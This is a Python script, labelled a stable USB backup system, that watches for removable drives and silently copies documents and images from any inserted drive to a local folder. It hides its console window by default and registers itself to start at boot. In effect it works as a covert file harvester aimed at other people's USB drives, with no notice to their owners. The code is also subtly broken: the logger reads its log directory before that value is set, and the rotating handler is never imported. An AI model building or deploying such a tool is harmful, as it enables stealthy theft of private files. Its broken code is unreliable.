#!/usr/bin/env python3
"""
USB文件监控备份系统 - 完整稳定版
支持开机自启动（无需管理员权限）
"""

import os
import sys
import time
import json
import shutil
import psutil
import logging
import threading
import traceback
from pathlib import Path
from datetime import datetime
from typing import List, Dict, Optional, Tuple, Set

# 添加当前目录到模块搜索路径
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

class ConfigManager:
    """配置管理类"""

    def __init__(self, config_file: str = "config.json"):
        self.config_file = Path(config_file)
        self.data = self._load_config()

    def _load_config(self) -> Dict:
        """加载配置文件"""
        default_config = {
            "keywords": [".doc", ".docx", ".pdf", ".xls", ".xlsx", ".ppt", ".pptx", ".jpg", ".png"],
            "backup_folder": "USB_Backup",
            "min_free_space_gb": 5,
            "max_file_size_mb": 100,
            "check_interval": 3,
            "exclude_folders": ["System Volume Information", "$RECYCLE.BIN", "Windows"],
            "cleanup_strategy": "oldest_first",
            "max_backup_age_days": 30,
            "log_level": "INFO",
            "enable_autostart": True,
            "hidden_mode": True,
            "usb_label_as_folder": True,
            "backup_by_date": True,
            "max_total_size_gb": 50
        }

        # 如果配置文件不存在，创建默认配置
        if not self.config_file.exists():
            print(f"[INFO] 创建默认配置文件: {self.config_file}")
            self._save_config(default_config)
            return default_config

        try:
            with open(self.config_file, 'r', encoding='utf-8') as f:
                content = f.read().strip()
                if not content:
                    print("[WARN] 配置文件为空，使用默认配置")
                    self._save_config(default_config)
                    return default_config

                config = json.loads(content)

                # 合并默认配置
                for key, value in default_config.items():
                    if key not in config:
                        config[key] = value

                return config

        except json.JSONDecodeError as e:
            print(f"[ERROR] 配置文件格式错误，使用默认配置: {e}")
            self._save_config(default_config)
            return default_config
        except Exception as e:
            print(f"[ERROR] 加载配置文件失败，使用默认配置: {e}")
            return default_config

    def _save_config(self, config: Dict) -> bool:
        """保存配置文件"""
        try:
            with open(self.config_file, 'w', encoding='utf-8') as f:
                json.dump(config, f, indent=2, ensure_ascii=False)
            return True
        except Exception as e:
            print(f"[ERROR] 保存配置文件失败: {e}")
            return False

    def get(self, key: str, default=None):
        """获取配置值"""
        return self.data.get(key, default)

    def update(self, key: str, value) -> bool:
        """更新配置值"""
        self.data[key] = value
        return self._save_config(self.data)

    def save(self) -> bool:
        """保存当前配置"""
        return self._save_config(self.data)

class Logger:
    """日志管理类"""

    def __init__(self, config: ConfigManager):
        self.config = config
        self.logger = self._setup_logger()
        self.log_dir = Path("logs")
        self.log_file = self.log_dir / "usb_backup.log"

    def _setup_logger(self):
        """设置日志系统"""
        # 创建日志目录
        self.log_dir.mkdir(exist_ok=True)

        # 创建日志记录器
        logger = logging.getLogger("USBBackup")

        # 设置日志级别
        log_level = self.config.get("log_level", "INFO")
        logger.setLevel(getattr(logging, log_level.upper()))

        # 清除现有处理器
        logger.handlers.clear()

        # 文件处理器 - 带滚动
        file_handler = logging.handlers.RotatingFileHandler(
            self.log_file,
            maxBytes=10*1024*1024,  # 10MB
            backupCount=5,
            encoding='utf-8'
        )
        file_formatter = logging.Formatter(
            '%(asctime)s [%(levelname)s] %(message)s',
            datefmt='%Y-%m-%d %H:%M:%S'
        )
        file_handler.setFormatter(file_formatter)
        logger.addHandler(file_handler)

        # 如果不在隐藏模式，也输出到控制台
        if not self.config.get("hidden_mode", True):
            console_handler = logging.StreamHandler()
            console_handler.setFormatter(file_formatter)
            logger.addHandler(console_handler)

        return logger

    def info(self, message: str):
        """记录信息日志"""
        self.logger.info(message)

    def warning(self, message: str):
        """记录警告日志"""
        self.logger.warning(message)

    def error(self, message: str, exc: Exception = None):
        """记录错误日志"""
        if exc:
            self.logger.error(f"{message}: {exc}", exc_info=True)
        else:
            self.logger.error(message)

    def debug(self, message: str):
        """记录调试日志"""
        self.logger.debug(message)

    def get_log_path(self) -> Path:
        """获取日志文件路径"""
        return self.log_file

class DiskManager:
    """磁盘管理类"""

    def __init__(self, logger: Logger, config: ConfigManager):
        self.logger = logger
        self.config = config

    def get_disk_info(self, path: str) -> Dict:
        """获取磁盘信息"""
        try:
            usage = psutil.disk_usage(path)
            return {
                "total_gb": usage.total / (1024**3),
                "used_gb": usage.used / (1024**3),
                "free_gb": usage.free / (1024**3),
                "usage_percent": usage.percent,
                "path": path
            }
        except Exception as e:
            self.logger.error(f"获取磁盘信息失败 {path}", e)
            return {"total_gb": 0, "used_gb": 0, "free_gb": 0, "usage_percent": 100, "path": path}

    def check_space(self, path: str) -> Tuple[bool, float, float]:
        """检查磁盘空间"""
        disk_info = self.get_disk_info(path)
        min_space = self.config.get("min_free_space_gb", 5)
        free_space = disk_info["free_gb"]

        has_enough = free_space >= min_space
        return has_enough, free_space, min_space

    def get_backup_folder_size(self, backup_folder: Path) -> float:
        """获取备份文件夹总大小（GB）"""
        total_size = 0
        try:
            for file_path in backup_folder.rglob("*"):
                if file_path.is_file():
                    try:
                        total_size += file_path.stat().st_size
                    except:
                        continue
            return total_size / (1024**3)
        except Exception as e:
            self.logger.error(f"获取备份文件夹大小失败", e)
            return 0

    def cleanup_by_size(self, backup_folder: Path) -> Dict:
        """按大小清理文件"""
        results = {"files_deleted": 0, "space_freed_gb": 0, "errors": 0}

        try:
            max_size_gb = self.config.get("max_total_size_gb", 50)
            current_size = self.get_backup_folder_size(backup_folder)

            if current_size <= max_size_gb:
                return results

            # 收集文件信息
            files_info = []
            for file_path in backup_folder.rglob("*"):
                if file_path.is_file():
                    try:
                        stat = file_path.stat()
                        files_info.append({
                            "path": file_path,
                            "size": stat.st_size,
                            "mtime": stat.st_mtime
                        })
                    except:
                        continue

            if not files_info:
                return results

            # 按修改时间排序（最旧优先）
            files_info.sort(key=lambda x: x["mtime"])

            # 删除文件直到满足大小限制
            for file_info in files_info:
                try:
                    size_gb = file_info["size"] / (1024**3)
                    file_info["path"].unlink()

                    results["files_deleted"] += 1
                    results["space_freed_gb"] += size_gb

                    self.logger.info(f"清理文件（大小限制）: {file_info['path'].name} ({size_gb:.3f}GB)")

                    # 检查是否满足大小要求
                    current_size = self.get_backup_folder_size(backup_folder)
                    if current_size <= max_size_gb:
                        break

                except Exception as e:
                    results["errors"] += 1
                    self.logger.error(f"删除文件失败 {file_info['path']}", e)

            return results

        except Exception as e:
            self.logger.error("按大小清理失败", e)
            return results

    def cleanup_by_age(self, backup_folder: Path) -> Dict:
        """按年龄清理文件"""
        results = {"files_deleted": 0, "space_freed_gb": 0, "errors": 0}

        try:
            max_age_days = self.config.get("max_backup_age_days", 30)
            strategy = self.config.get("cleanup_strategy", "oldest_first")

            # 收集文件信息
            files_info = []
            current_time = time.time()

            for file_path in backup_folder.rglob("*"):
                if file_path.is_file():
                    try:
                        stat = file_path.stat()
                        age_days = (current_time - stat.st_mtime) / (24 * 3600)

                        files_info.append({
                            "path": file_path,
                            "size": stat.st_size,
                            "mtime": stat.st_mtime,
                            "age_days": age_days
                        })
                    except:
                        continue

            if not files_info:
                return results

            # 按策略排序
            if strategy == "oldest_first":
                files_info.sort(key=lambda x: x["mtime"])  # 最旧优先
            elif strategy == "largest_first":
                files_info.sort(key=lambda x: x["size"], reverse=True)  # 最大优先

            # 删除超过年龄限制的文件
            for file_info in files_info:
                if file_info["age_days"] > max_age_days:
                    try:
                        size_gb = file_info["size"] / (1024**3)
                        file_info["path"].unlink()

                        results["files_deleted"] += 1
                        results["space_freed_gb"] += size_gb

                        self.logger.info(f"清理文件（年龄限制）: {file_info['path'].name} ({file_info['age_days']:.1f}天)")

                    except Exception as e:
                        results["errors"] += 1
                        self.logger.error(f"删除文件失败 {file_info['path']}", e)

            return results

        except Exception as e:
            self.logger.error("按年龄清理失败", e)
            return results

class USBMonitor:
    """USB监控类"""

    def __init__(self, logger: Logger, config: ConfigManager):
        self.logger = logger
        self.config = config
        self.disk_manager = DiskManager(logger, config)

        # 状态变量
        self.running = False
        self.backup_folder = Path(config.get("backup_folder", "USB_Backup"))
        self.processed_drives: Set[str] = set()
        self.usb_thread: Optional[threading.Thread] = None

        # 初始化
        self._setup_backup_folder()

    def _setup_backup_folder(self):
        """设置备份文件夹"""
        try:
            self.backup_folder.mkdir(parents=True, exist_ok=True)

            # 创建说明文件
            readme_path = self.backup_folder / "README.txt"
            if not readme_path.exists():
                readme_content = self._generate_readme()
                readme_path.write_text(readme_content, encoding='utf-8')

            self.logger.info(f"备份文件夹: {self.backup_folder.absolute()}")

        except Exception as e:
            self.logger.error("创建备份文件夹失败", e)

    def _generate_readme(self) -> str:
        """生成README文件内容"""
        return f"""USB文件自动备份系统
======================

创建时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
备份目录: {self.backup_folder}

系统说明:
---------
1. 自动监控USB设备插入
2. 自动备份符合条件的重要文件
3. 智能管理磁盘空间
4. 详细记录操作日志

备份规则:
---------
- 文件类型: {', '.join(self.config.get('keywords', [])[:5])}...
- 最大文件: {self.config.get('max_file_size_mb', 100)}MB
- 最小空间: {self.config.get('min_free_space_gb', 5)}GB
- 清理策略: {self.config.get('cleanup_strategy', 'oldest_first')}
- 保留天数: {self.config.get('max_backup_age_days', 30)}天
- 总大小限制: {self.config.get('max_total_size_gb', 50)}GB

日志文件:
---------
- logs/usb_backup.log
- logs/usb_backup.log.1 ... (滚动备份)

配置文件:
---------
- config.json

如需修改设置，请编辑 config.json 文件。
"""

    def get_usb_drives(self) -> List[str]:
        """获取USB驱动器列表"""
        usb_drives = []

        try:
            # 方法1: 使用psutil
            for partition in psutil.disk_partitions():
                if 'removable' in partition.opts.lower():
                    usb_drives.append(partition.device)

            # 方法2: Windows API (备用)
            if not usb_drives and sys.platform == "win32":
                try:
                    import win32api
                    import win32file

                    drives = win32api.GetLogicalDriveStrings()
                    drives = drives.split('\000')[:-1]

                    for drive in drives:
                        if win32file.GetDriveType(drive) == win32file.DRIVE_REMOVABLE:
                            usb_drives.append(drive)
                except:
                    pass

        except Exception as e:
            self.logger.error("获取USB驱动器失败", e)

        return usb_drives

    def get_usb_label(self, drive_path: str) -> str:
        """获取USB设备标签"""
        try:
            if sys.platform == "win32":
                import win32api
                label = win32api.GetVolumeInformation(drive_path)[0]
                return label if label else "UNLABELED"
        except:
            pass

        # 如果获取失败，使用驱动器字母
        return drive_path.replace(':\\', '_drive')

    def should_copy_file(self, file_path: Path) -> Tuple[bool, str]:
        """检查是否应该复制文件"""
        try:
            # 检查文件大小
            max_size_mb = self.config.get("max_file_size_mb", 100)
            max_size_bytes = max_size_mb * 1024 * 1024

            file_size = file_path.stat().st_size

            if file_size > max_size_bytes:
                size_mb = file_size / (1024 * 1024)
                return False, f"文件过大({size_mb:.1f}MB > {max_size_mb}MB)"

            # 检查文件扩展名/关键词
            file_ext = file_path.suffix.lower()
            file_name = file_path.name.lower()
            keywords = [k.lower() for k in self.config.get("keywords", [])]

            for keyword in keywords:
                if keyword.startswith('.') and file_ext == keyword:
                    return True, f"匹配扩展名: {keyword}"
                elif keyword in file_name:
                    return True, f"文件名包含关键词: {keyword}"

            return False, "未匹配关键词"

        except Exception as e:
            return False, f"检查文件失败: {e}"

    def copy_usb_files(self, usb_path: str):
        """复制USB文件"""
        usb_label = self.get_usb_label(usb_path)

        self.logger.info(f"开始处理USB设备: {usb_path} (标签: {usb_label})")

        try:
            # 检查磁盘空间
            has_space, free_space, min_space = self.disk_manager.check_space(str(self.backup_folder))

            if not has_space:
                self.logger.warning(f"磁盘空间不足，开始清理: 可用{free_space:.1f}GB / 需要{min_space}GB")

                # 先按大小清理
                size_result = self.disk_manager.cleanup_by_size(self.backup_folder)
                if size_result["files_deleted"] > 0:
                    self.logger.info(f"按大小清理完成: 删除{size_result['files_deleted']}个文件")

                # 再按年龄清理
                age_result = self.disk_manager.cleanup_by_age(self.backup_folder)
                if age_result["files_deleted"] > 0:
                    self.logger.info(f"按年龄清理完成: 删除{age_result['files_deleted']}个文件")

            # 再次检查空间
            has_space, free_space, min_space = self.disk_manager.check_space(str(self.backup_folder))
            if not has_space:
                self.logger.error("清理后空间仍然不足，跳过此USB设备")
                return

            # 统计信息
            files_copied = 0
            files_skipped = 0
            total_size = 0

            # 遍历USB文件
            usb_root = Path(usb_path)
            exclude_folders = self.config.get("exclude_folders", [])

            for root, dirs, files in os.walk(usb_path):
                # 排除特定文件夹
                dirs[:] = [d for d in dirs if d not in exclude_folders]

                for file in files:
                    src_file = Path(root) / file

                    # 检查文件
                    should_copy, reason = self.should_copy_file(src_file)

                    if not should_copy:
                        files_skipped += 1
                        self.logger.debug(f"跳过文件: {file} - {reason}")
                        continue

                    # 生成目标路径
                    if self.config.get("backup_by_date", True):
                        date_folder = datetime.now().strftime("%Y%m%d")
                        rel_path = src_file.relative_to(usb_root)
                        dest_file = self.backup_folder / usb_label / date_folder / rel_path
                    else:
                        rel_path = src_file.relative_to(usb_root)
                        dest_file = self.backup_folder / usb_label / rel_path

                    # 处理文件名冲突
                    counter = 1
                    original_dest = dest_file
                    while dest_file.exists():
                        stem = original_dest.stem
                        suffix = original_dest.suffix
                        dest_file = original_dest.parent / f"{stem}_{counter}{suffix}"
                        counter += 1

                    # 复制文件
                    try:
                        dest_file.parent.mkdir(parents=True, exist_ok=True)
                        shutil.copy2(src_file, dest_file)

                        files_copied += 1
                        file_size = src_file.stat().st_size
                        total_size += file_size

                        self.logger.info(f"已备份: {file} -> {dest_file.relative_to(self.backup_folder)}")

                    except Exception as e:
                        files_skipped += 1
                        self.logger.error(f"复制文件失败 {file}", e)

            # 记录结果
            if files_copied > 0:
                size_mb = total_size / (1024 * 1024)
                self.logger.info(
                    f"USB处理完成: {usb_path}\n"
                    f"  复制文件: {files_copied}个\n"
                    f"  跳过文件: {files_skipped}个\n"
                    f"  总大小: {size_mb:.1f}MB"
                )
            else:
                self.logger.info(f"USB处理完成: {usb_path} - 未找到符合条件的文件")

        except Exception as e:
            self.logger.error(f"处理USB设备失败 {usb_path}", e)

    def monitor_loop(self):
        """监控循环"""
        self.logger.info("开始监控USB设备...")

        check_interval = self.config.get("check_interval", 3)
        status_interval = 300  # 每5分钟记录一次状态

        last_status_time = time.time()

        while self.running:
            try:
                current_time = time.time()

                # 获取当前USB设备
                current_drives = set(self.get_usb_drives())

                # 检查新插入的设备
                new_drives = current_drives - self.processed_drives

                for drive in new_drives:
                    self.copy_usb_files(drive)
                    self.processed_drives.add(drive)

                # 更新已处理列表（移除已拔出的设备）
                self.processed_drives = self.processed_drives.intersection(current_drives)

                # 定期记录状态
                if current_time - last_status_time >= status_interval:
                    self.logger.info(f"监控状态: 已处理设备={len(self.processed_drives)}")
                    last_status_time = current_time

                # 等待
                time.sleep(check_interval)

            except KeyboardInterrupt:
                self.logger.info("收到停止信号")
                break
            except Exception as e:
                self.logger.error("监控循环发生错误", e)
                time.sleep(10)  # 错误时等待更长时间

    def start(self):
        """启动监控"""
        if self.running:
            self.logger.warning("监控已在运行中")
            return

        self.running = True

        # 启动日志
        self.logger.info("=" * 60)
        self.logger.info("USB文件监控备份系统启动")
        self.logger.info(f"版本: 2.0 稳定版")
        self.logger.info(f"进程ID: {os.getpid()}")
        self.logger.info(f"备份目录: {self.backup_folder}")
        self.logger.info(f"文件类型: {', '.join(self.config.get('keywords', [])[:5])}...")
        self.logger.info(f"最大文件: {self.config.get('max_file_size_mb')}MB")
        self.logger.info(f"最小空间: {self.config.get('min_free_space_gb')}GB")
        self.logger.info(f"总大小限制: {self.config.get('max_total_size_gb')}GB")
        self.logger.info(f"检查间隔: {self.config.get('check_interval')}秒")
        self.logger.info("=" * 60)

        # 启动监控线程
        self.usb_thread = threading.Thread(target=self.monitor_loop, daemon=True)
        self.usb_thread.start()

        self.logger.info("系统启动完成，开始监控USB设备...")

        # 保持主线程运行
        try:
            while self.running and self.usb_thread.is_alive():
                time.sleep(1)
        except KeyboardInterrupt:
            self.logger.info("收到停止信号")
        finally:
            self.stop()

    def stop(self):
        """停止监控"""
        self.running = False
        self.logger.info("系统正在停止...")

        if self.usb_thread and self.usb_thread.is_alive():
            self.usb_thread.join(timeout=5)

        self.logger.info("=" * 60)
        self.logger.info("系统已停止")
        self.logger.info(f"累计处理USB设备: {len(self.processed_drives)}")
        self.logger.info("=" * 60)

def setup_autostart():
    """设置开机自启动"""
    try:
        # 动态导入自启动模块
        import autostart

        # 获取当前程序路径
        if getattr(sys, 'frozen', False):
            # 打包后的exe文件
            exe_path = sys.executable
        else:
            # Python脚本文件
            exe_path = os.path.abspath(sys.argv[0])

        # 设置自启动
        manager = autostart.AutoStartManager("USBBackup")
        success = manager.set_autostart(exe_path)

        if success:
            print("[INFO] 已设置开机自启动")
        else:
            print("[WARN] 设置开机自启动失败")

        return success

    except ImportError:
        print("[WARN] 自启动模块不可用，跳过设置")
        return False
    except Exception as e:
        print(f"[ERROR] 设置自启动失败: {e}")
        return False

def hide_console():
    """隐藏控制台窗口"""
    if sys.platform == "win32":
        try:
            import ctypes
            # 隐藏当前控制台窗口
            console_window = ctypes.windll.kernel32.GetConsoleWindow()
            if console_window:
                ctypes.windll.user32.ShowWindow(console_window, 0)  # 0 = SW_HIDE
        except:
            pass

def main():
    """主函数"""
    print("=" * 60)
    print("USB文件监控备份系统")
    print("=" * 60)

    # 初始化配置
    print("[INFO] 初始化配置...")
    config = ConfigManager()

    # 如果启用隐藏模式，隐藏控制台窗口
    if config.get("hidden_mode", True):
        hide_console()

    # 设置开机自启动
    if config.get("enable_autostart", True):
        print("[INFO] 设置开机自启动...")
        setup_autostart()

    # 初始化日志
    print("[INFO] 初始化日志系统...")
    logger = Logger(config)

    try:
        # 初始化并启动监控
        print("[INFO] 初始化USB监控...")
        monitor = USBMonitor(logger, config)

        print("[INFO] 启动监控系统...")
        monitor.start()

    except Exception as e:
        print(f"[ERROR] 程序运行失败: {e}")
        traceback.print_exc()

        # 尝试记录到日志
        try:
            logger.error("程序运行失败", e)
        except:
            pass

        input("\n按回车键退出...")

if __name__ == "__main__":
    main()